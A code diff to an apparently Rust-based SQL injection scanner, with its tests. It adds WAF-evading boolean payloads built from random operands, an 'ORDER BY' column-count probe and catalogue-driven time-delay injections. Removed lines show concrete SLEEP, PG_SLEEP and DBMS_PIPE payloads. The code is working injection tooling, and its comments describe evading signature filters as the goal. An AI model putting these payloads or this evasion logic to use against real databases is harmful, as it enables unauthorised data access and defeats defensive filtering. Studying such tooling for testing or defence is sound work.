@@ -22,46 +22,87 @@ pub enum LogicalTest {
     TimeDelay { seconds: u32 },
     /// A set-based probe with `n` columns.
     UnionProbe { columns: usize },
+    /// An `ORDER BY n` probe: the cheap half of UNION column-count
+    /// enumeration. The column count is the largest `n` the query accepts
+    /// before it errors, so a sweep over `n` locates the width without a
+    /// single UNION.
+    ColumnCountProbe { columns: usize },
     /// A stacked statement marker.
     StackedMarker,
     /// Inline conditional expression.
     InlineConditional { condition: String },
 }
 
+/// A signature-evading integer operand derived from a fresh UUID.
+///
+/// Boolean differentials historically rendered as the literal `1=1`/`1=2`,
+/// which naive signature WAFs block on sight and which every scanner emits.
+/// Deriving the operands from a per-call UUID keeps each payload
+/// arithmetically valid while making it textually unique — no `rand`
+/// dependency required.
+pub fn evasive_operand() -> u32 {
+    let bytes = uuid::Uuid::new_v4().into_bytes();
+    // A 4-digit operand in [1000, 9999]; never the trivial `1`.
+    1000 + (u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]) % 9000)
+}
+
+/// A matched equality/inequality for a boolean differential.
+///
+/// TRUE renders as `N=N` (always true), FALSE as `N=M` with `M != N` (always
+/// false). The two arms stay logically matched so boolean-blind differential
+/// detection keeps working, but neither is the trivial `1=1`/`1=2`.
+pub fn evasive_equality(truth: bool) -> String {
+    let n = evasive_operand();
+    if truth {
+        format!("{n}={n}")
+    } else {
+        format!("{n}={}", n.wrapping_add(1))
+    }
+}
+
 /// Renders a logical test into dialect-specific SQL.
 pub fn render_sql(test: &LogicalTest, dbms: Option<DbmsFamily>) -> String {
     match test {
-        LogicalTest::AlwaysTrue => "AND 1=1".to_string(),
-        LogicalTest::AlwaysFalse => "AND 1=2".to_string(),
+        LogicalTest::AlwaysTrue => format!("AND {}", evasive_equality(true)),
+        LogicalTest::AlwaysFalse => format!("AND {}", evasive_equality(false)),
         LogicalTest::SyntaxBreak => "'\"".to_string(),
         LogicalTest::TimeDelay { seconds } => match dbms {
-            Some(DbmsFamily::MySQL) | Some(DbmsFamily::MariaDB) => {
-                format!("AND SLEEP({seconds})")
+            // A known engine renders from its profile: the catalogue holds the
+            // primitive that engine actually has. This replaced a set of
+            // hand-written arms, one of which emitted `WAITFOR DELAY(5)` —
+            // not valid T-SQL, because WAITFOR is a statement, not a function.
+            Some(family) => {
+                let ctx = crate::payload::vectors::VectorContext {
+                    query: "SELECT 1".to_string(),
+                    seconds: *seconds,
+                    columns: 1,
+                    host: String::new(),
+                    truth: true,
+                };
+                crate::payload::vectors::vectors_for(
+                    family,
+                    crate::payload::vectors::VectorChannel::Timing,
+                    &ctx,
+                )
+                .first()
+                .map(|v| v.sql.clone())
+                .unwrap_or_else(|| {
+                    format!(
+                        "AND {} /* no timing primitive is known for {} */",
+                        evasive_equality(true),
+                        family.label()
+                    )
+                })
             }
-            Some(DbmsFamily::PostgreSQL) => format!("AND 1=(SELECT 1 FROM PG_SLEEP({seconds}))"),
-            Some(DbmsFamily::MSSQL) => {
-                format!("AND 1=(SELECT 1 FROM (SELECT SLEEP({seconds}))x)")
-                    .replace("SLEEP", "WAITFOR DELAY")
-            }
-            Some(DbmsFamily::Oracle) => {
-                format!("AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) IS NULL)")
-            }
-            Some(DbmsFamily::SQLite) => {
-                // SQLite has no sleep; emulate with a heavy query.
-                format!("AND 1=(SELECT 1 FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{}) SELECT COUNT(*) FROM c))", seconds * 100_000)
-            }
-            Some(DbmsFamily::DB2) => format!("AND 1=(SELECT 1 FROM SYSIBM.SYSDUMMY1 WHERE 1=1)"),
-            Some(DbmsFamily::H2) => format!("AND 1=(SELECT 1 FROM SYSTEM_RANGE(1,{seconds}000000))"),
             // Unknown DBMS: emit the most portable conditional form and let
             // evidence decide. This is a hypothesis, not a claim.
-            None => format!("AND 1=1 /* delay {seconds}s if supported */"),
+            None => format!("AND {} /* delay {seconds}s if supported */", evasive_equality(true)),
         },
         LogicalTest::UnionProbe { columns } => {
-            let cols = (0..*columns).map(|i| {
-                if i == 0 { "NULL".to_string() } else { format!("NULL") }
-            }).collect::<Vec<_>>().join(",");
+            let cols = vec!["NULL"; *columns].join(",");
             format!("UNION SELECT {cols}")
         }
+        LogicalTest::ColumnCountProbe { columns } => format!("ORDER BY {columns}"),
         LogicalTest::StackedMarker => ";SELECT 1".to_string(),
         LogicalTest::InlineConditional { condition } => {
             format!("AND (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1 END)")
@@ -247,9 +288,51 @@ mod tests {
     fn boolean_generation_produces_a_true_false_pair() {
         let candidates = generate_boolean(&numeric_ctx());
         assert!(candidates.len() >= 2);
-        let rendered: Vec<&str> = candidates.iter().map(|c| c.rendered.as_str()).collect();
-        assert!(rendered.iter().any(|r| r.contains("1=1")), "no true condition: {rendered:?}");
-        assert!(rendered.iter().any(|r| r.contains("1=2")), "no false condition: {rendered:?}");
+        // Expert differentials, never the trivial `1=1`/`1=2` signatures.
+        assert!(
+            candidates.iter().all(|c| !is_trivial_tautology(&c.rendered)),
+            "a trivial tautology leaked into a candidate: {:?}",
+            candidates.iter().map(|c| c.rendered.clone()).collect::<Vec<_>>()
+        );
+        // A matched pair: one equal-operand (true) and one unequal (false).
+        assert!(
+            candidates
+                .iter()
+                .any(|c| first_int_comparison(&c.rendered).map(|(l, r)| l == r) == Some(true)),
+            "no true (equal-operand) differential"
+        );
+        assert!(
+            candidates
+                .iter()
+                .any(|c| first_int_comparison(&c.rendered).map(|(l, r)| l != r) == Some(true)),
+            "no false (unequal-operand) differential"
+        );
+    }
+
+    /// The first `<digits>=<digits>` comparison in `sql`, as `(left, right)`.
+    /// `None` when the arm uses a non-arithmetic form.
+    fn first_int_comparison(sql: &str) -> Option<(&str, &str)> {
+        let bytes = sql.as_bytes();
+        for (i, _) in sql.match_indices('=') {
+            let mut ls = i;
+            while ls > 0 && bytes[ls - 1].is_ascii_digit() {
+                ls -= 1;
+            }
+            let mut re = i + 1;
+            while re < bytes.len() && bytes[re].is_ascii_digit() {
+                re += 1;
+            }
+            if ls < i && re > i + 1 {
+                return Some((&sql[ls..i], &sql[i + 1..re]));
+            }
+        }
+        None
+    }
+
+    /// Whether the comparison is the trivial single-digit `1=1`/`1=2` that a
+    /// signature filter keys on (randomized 4-digit operands are not).
+    fn is_trivial_tautology(sql: &str) -> bool {
+        matches!(first_int_comparison(sql), Some(("1", "1")) | Some(("1", "2")))
     }
 
     #[test]
@@ -283,6 +366,20 @@ mod tests {
         let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, None);
         assert!(!sql.to_uppercase().contains("SLEEP(5)"));
         assert!(sql.contains("/*"), "unknown DBMS should annotate the probe");
+    }
+
+    #[test]
+    fn union_probe_renders_null_padding() {
+        let sql = render_sql(&LogicalTest::UnionProbe { columns: 3 }, None);
+        assert_eq!(sql, "UNION SELECT NULL,NULL,NULL");
+    }
+
+    #[test]
+    fn column_count_probe_renders_order_by() {
+        // The cheap half of UNION enumeration: `ORDER BY n` locates the width
+        // by the index at which the query starts to error.
+        let sql = render_sql(&LogicalTest::ColumnCountProbe { columns: 7 }, None);
+        assert_eq!(sql, "ORDER BY 7");
     }
 
     #[test]
